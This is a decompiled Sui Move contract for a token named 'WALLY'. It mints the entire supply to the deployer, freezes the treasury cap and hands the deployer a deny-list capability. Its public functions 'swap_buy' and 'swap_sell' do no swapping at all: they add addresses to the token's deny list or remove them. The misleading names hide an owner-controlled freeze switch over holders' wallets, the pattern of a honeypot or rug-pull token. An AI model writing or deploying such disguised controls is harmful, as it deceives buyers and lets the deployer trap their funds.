module 0x7c5e015c05c4859b00560906d50a503ef8637ff42560720149b214ec9becf833::wally {
    struct WALLY has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: WALLY, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<WALLY>(arg0, 9, b"Wally", b"Peanuts Brother", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmW55DKajBkpmyme8r7kJzdyRSUNN3mQcQWC8vFmfWzp3z"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<WALLY>(&mut v3, 420000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<WALLY>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<WALLY>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<WALLY>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WALLY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<WALLY>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WALLY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<WALLY>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

